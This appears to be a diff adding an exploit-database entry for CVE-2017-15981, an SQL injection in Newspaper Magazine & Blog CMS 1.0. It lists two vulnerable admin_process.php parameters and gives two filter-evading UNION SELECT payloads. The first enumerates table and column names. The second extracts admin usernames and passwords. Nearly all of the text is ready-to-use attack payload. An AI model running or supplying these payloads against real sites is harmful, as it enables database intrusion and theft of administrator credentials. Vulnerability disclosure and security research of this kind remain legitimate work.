@@ -1,0 +1,31 @@
+# # # # # 
+# Exploit Title: Newspaper Magazine & Blog CMS 1.0 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://geniusocean.com/
+# Software Link: https://codecanyon.net/item/mymagazine-fully-responsive-magazine-cms/19493325
+# Demo: http://demo.geniusocean.com/newspaper/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15981
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/admin/admin_process.php?act=editpollform&id=[SQL]
+# 
+# -2'++/*!00022UNION*/+/*!00022SELECT*/+0x31,(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),0x33,0x34,0x35,VerSiOn(),dAtAbAsE(),0x38,0x39,0x3130,0x3131,0x3132--+-
+# 
+# http://localhost/[PATH]/admin/admin_process.php?act=cateditform&id=[SQL]
+# 
+# -2'++/*!00022UNION*/+/*!00022SELECT*/+0x31,/*!00022cOnCat*/(username,0x3a,password),0x33,0x34,0x35+/*!00022from*/+admin--+-
+# 
+# Etc..
+# # # # #
